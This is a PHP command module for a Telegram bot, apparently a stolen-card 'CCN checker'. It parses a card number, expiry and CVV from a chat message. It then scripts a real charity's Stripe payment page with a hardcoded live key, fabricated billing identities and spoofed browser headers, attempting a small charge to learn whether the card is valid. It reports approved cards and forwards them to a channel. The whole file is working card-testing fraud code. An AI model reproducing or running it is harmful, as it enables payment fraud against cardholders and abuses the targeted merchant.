<?php

/*

///==[Stripe CC Checker Commands]==///

/ss creditcard - Checks the Credit Card

*/


$gateway = "Stripe Charge";
$check_type = "CCN";
$dir = dirname(__dir__,2);
include($dir."/config/config.php");
include($dir."/config/variables.php");
include_once($dir."/functions/bot.php");
include_once($dir."/functions/db.php");
include_once($dir."/functions/functions.php");
////////////====[MUTE]====////////////
$time_start = microtime(true);
$cookie = RandomString();
if(strpos($message, "/sn ") === 0 || strpos($message, "!sn ") === 0 || strpos($message, ".sn ") === 0){
//
//    $trans_completed = false;
//    $tries = 0;
//    $limit = 1;
//    while ($trans_completed == false && $tries < $limit ) {
//        $tries = $tries + 1;
    $antispam = antispamCheck($userId);
    $isPremium = get_prem_info($userId);
    addUser($userId);
    if ($antispam != False && $isPremium == "no"){
        bot('sendmessage',[
            'chat_id'=>$chat_id,
            'text'=>"[<u>ANTI SPAM</u>] Try again after <b>$antispam</b>s.",
            'parse_mode'=>'html',
            'reply_to_message_id'=> $message_id
        ]);
        return;

    }else {
        $messageidtoedit1 = bot('sendmessage', [
            'chat_id' => $chat_id,
            'text' => "<b>Wait for result...</b>",
            'parse_mode' => 'html',
            'reply_to_message_id' => $message_id

        ]);

        $messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');
        $lista = substr($message, 4);


        if (preg_match_all("/(\d{15})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{4})/", $lista, $matches)||preg_match_all("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $lista, $matches)){
            $creditcard = $matches[0][0];
            $cc = multiexplode(array(":", "|", "/", " "), $creditcard)[0];
            $mm = multiexplode(array(":", "|", "/", " "), $creditcard)[1];
            $yy = multiexplode(array(":", "|", "/", " "), $creditcard)[2];
            $cvv = multiexplode(array(":", "|", "/", " "), $creditcard)[3];
            $yy1 = substr($yy, 2, 2);
            $bin = substr($cc, 0, 6);
            $cbin = substr($cc, 0, 1);
            ###CHECKER PART###
            $binlist = json_decode(fbankinfo($bin),true);
            $ccbank = $binlist['Bank'];
            $ccvendor = $binlist['Vendor'];
            $cctype = $binlist['Bank_Info'];
            $cc_country = $binlist['Country'];
            $abn = $binlist['Abn'];
            $cc_emoji = $binlist['emoji'];



            $info = json_decode(random_info(),true);
            $fname = $info['fname'];
            $lname = $info['lname'];
            $email = $info['email'];
            $street = $info['street'];
            $city = $info['city'];
            $state = $info['state'];
            $phone = $info['phone'];
            $postcode = $info['postcode'];
            ###CHECKER PART###
            $zip = rand(90010,94000);
            if($cbin == 5){
                $ctype = 'MasterCard';
            }
            else if($cbin == 4){
                $ctype = 'Visa';
            }
            $Amount = 0.8;

            $cookie = RandomString();
            $str = substr(randomString(), 0, 7);
               $page =  cURL(
                   "https://marioncares.org/asp-payment-box/?product_id=2328",
                   $headers = [
                       'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                       'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36'
                   ],
                   "",
                   "GET",
                   1,
                   $cookie
               ); echo $confirm = GetStr($page, '"asp_pp_ajax_nonce":"', '"');
               echo $create_pi = GetStr($page, '"asp_pp_ajax_create_pi_nonce":"', '"');

               $get_id =  cURL(
                   "https://m.stripe.com/6",
                   $headers = [
                       'accept: */*',
                       'content-type: text/plain;charset=UTF-8',
                       'origin: https://m.stripe.network',
                       'referer: https://m.stripe.network/',
                       'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36'
                   ],
                   "",
                   "POST",
                   1,
                   $cookie
               );
               $muid =  GetStr($get_id, '"muid":"', '"');
               $guid = GetStr($get_id, '"guid":"', '"');
               $sid = GetStr($get_id, '"sid":"', '"');
               if (empty($guid)) {
                   $guid = "N/A";
               }
               if (empty($muid)) {
                   $muid = "N/A";
               }
               if (empty($sid)) {
                   $sid = "N/A";
               }
               $ajax_create_pi =  cURL(
                   "https://marioncares.org/wp-admin/admin-ajax.php",
                   $headers = [
                       "accept: */*",
                       "content-type: application/x-www-form-urlencoded",
                       "referer: https://marioncares.org/asp-payment-box/?product_id=2328",
                       "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"
                   ],
                   'action=asp_pp_create_pi&nonce='.$create_pi.'&amount=100&curr=USD&product_id=2328&quantity=1&billing_details={"name":"'.$str.' '.$str.'","email":"'.$str.'%40gmail.com","address":{"line1":"'.$str.'","city":"'.$str.'","state":"Washington","country":"US","postal_code":"'.rand(90100,98000).'"}}&token=31c5216646930a81b7c82883479cd490',
                   "POST",
                   1,
                   $cookie
               ); $pi_id = GetStr($ajax_create_pi, '"pi_id":"', '"');

               $token_method =  cURL(
                   "https://api.stripe.com/v1/tokens",
                   $headers = [
                       "accept: application/json",
                       "content-type: application/x-www-form-urlencoded",
                       "origin: https://js.stripe.com",
                       "referer: https://js.stripe.com/",
                       "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"
                   ],
                   "card[name]=$str+$str&card[address_line1]=$str&card[address_city]=$str&card[address_state]=Washington&card[address_zip]=".rand(90100,98000)."&card[address_country]=US&card[number]=$cc&card[cvc]=&card[exp_month]=$mm&card[exp_year]=$yy1&guid=$guid&muid=$muid&sid=$sid&payment_user_agent=stripe.js%2Feb$str%3B+stripe-js-v3%2Feb$str&time_on_page=2143238&key=pk_live_SEAtmiy2ENq8XvT3VwFFAlWR00JExL89vM&_stripe_version=2020-03-02",
                   "POST",
                   1,
                   $cookie
               ); $token = GetStr($token_method, '"id": "', '"');
               if (strpos($token_method, '"id": "tok_') && !strpos($token_method, '"error":')) {

                   $ajax_confirm =  cURL(
                       "https://marioncares.org/wp-admin/admin-ajax.php",
                       $headers = [
                           "accept: */*",
                           "content-type: application/x-www-form-urlencoded",
                           "sec-fetch-site: same-origin",
                           "referer: https://marioncares.org/asp-payment-box/?product_id=2328",
                           "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"
                       ],
                       'action=asp_pp_confirm_pi&nonce='.$confirm.'&product_id=2328&pi_id='.$pi_id.'&token=31c5216646930a81b7c82883479cd490&opts={"shipping":{"name":"'.$str.' '.$str.'","address":{"line1":"'.$str.'","city":"'.$str.'","state":"Washington","country":"US","postal_code":"'.rand(91000,98000).'"}},"receipt_email":"'.$str.'%40gmail.com","payment_method_data":{"type":"card","card":{"token":"'.$token.'"},"billing_details":{"name":"'.$str.' '.$str.'","email":"'.$str.'%40gmail.com"}}}',
                       "POST",
                       1,
                       $cookie
                   );


                   // $ips = GetStr($token_method, '"client_ip": "', '"');
                   $response = GetStr($ajax_confirm, '"Stripe API error occurred: ','"');
               }else{
                   $response = GetStr($token_method, '"message": "','"');
               }                ###END OF CHECKER PART###

               $time = number_format(microtime(true) - $time_start, 2);
                if (strpos($ajax_confirm, '"pi_id":"pi_')){
                    addTotal();
                    addUserTotal($userId);
                    addCVV();
                    addUserCVV($userId);
                    bot('editMessageText', [
                        'chat_id' => $chat_id,
                        'message_id' => $messageidtoedit,
                        'text' => "<b>APPROVED ✅
<b>Card -»</b> <code>$lista</code>
Response -» Approved
Type -» $check_type 
Gateway -» $gateway $ 1
Time -» <b>$time</b><b>s</b>
------- Bin Info -------</b>
<b>Bank -»</b> $ccbank
<b>Brand -»</b> $ccvendor
<b>Type -»</b> $cctype
<b>Country -»</b> $cc_country($abn) $cc_emoji 
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>",
                        'parse_mode' => 'html',
                        'disable_web_page_preview' => 'true'

                    ]);$trans_completed = true;copyLogs("@payamansoyccn",$chat_id,$messageidtoedit);
            } elseif (strpos($token_method, 'empty string') || strpos($ajax_confirm, 'empty string') || strpos($ajax_confirm, 'Unrecognized')) {
                    addTotal();
                    addUserTotal($userId);
                    bot('editMessageText', [
                        'chat_id' => $chat_id,
                        'message_id' => $messageidtoedit,
                        'text' => "<b>DECLINED ❌ 
<b>Card -»</b> <code>$lista</code>
Response -» $response
Type -» $check_type 
Gateway -» $gateway 
Time -» <b>$time</b><b>s</b>
------- Bin Info -------</b>
<b>Bank -»</b> $ccbank
<b>Brand -»</b> $ccvendor
<b>Type -»</b> $cctype
<b>Country -»</b> $cc_country($abn) $cc_emoji 
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>",
                        'parse_mode' => 'html',
                        'disable_web_page_preview' => 'true'

                    ]);$trans_completed = true;
            } else {
                    addTotal();
                    addUserTotal($userId);
                    bot('editMessageText', [
                        'chat_id' => $chat_id,
                        'message_id' => $messageidtoedit,
                        'text' => "<b>DECLINED ❌ 
<b>Card -»</b> <code>$lista</code>
Response -» $response
Type -» $check_type 
Gateway -» $gateway 
Time -» <b>$time</b><b>s</b>
------- Bin Info -------</b>
<b>Bank -»</b> $ccbank
<b>Brand -»</b> $ccvendor
<b>Type -»</b> $cctype
<b>Country -»</b> $cc_country($abn) $cc_emoji 
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>",
                        'parse_mode' => 'html',
                        'disable_web_page_preview' => 'true'

                    ]);$trans_completed = true;
            }

        } else {
            bot('editMessageText', [
                'chat_id' => $chat_id,
                'message_id' => $messageidtoedit,
                'text' => "<b>INVALID FORMAT: (cmd) XXXXXXXXXXXXXXXXXX|XX|XXXX|XXX</b>",
                'parse_mode' => 'html', 'disable_web_page_preview' => 'true']);
        }
    }$trans_completed = true;


}


?>
